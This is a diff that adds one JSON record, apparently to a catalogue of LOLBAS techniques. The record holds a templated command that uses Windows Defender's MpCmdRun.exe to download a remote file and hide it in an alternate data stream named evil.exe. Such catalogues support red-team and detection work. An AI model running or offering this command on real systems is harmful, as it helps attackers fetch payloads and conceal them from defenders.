@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-mpcmdrun-exe-ads",
+  "name": "LOLBAS · MpCmdRun.exe (ADS)",
+  "command": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe",
+  "description": "Download file to machine and store it in Alternate Data Stream",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "mpcmdrun",
+    "ads"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/MpCmdRun/",
+  "upstream_id": "MpCmdRun.exe/ADS/0",
+  "category": "lolbas",
+  "subcategory": "ads",
+  "references": [
+    {
+      "title": "LOLBAS — MpCmdRun.exe",
+      "url": "https://lolbas-project.github.io/lolbas/MpCmdRun/"
+    }
+  ]
+}
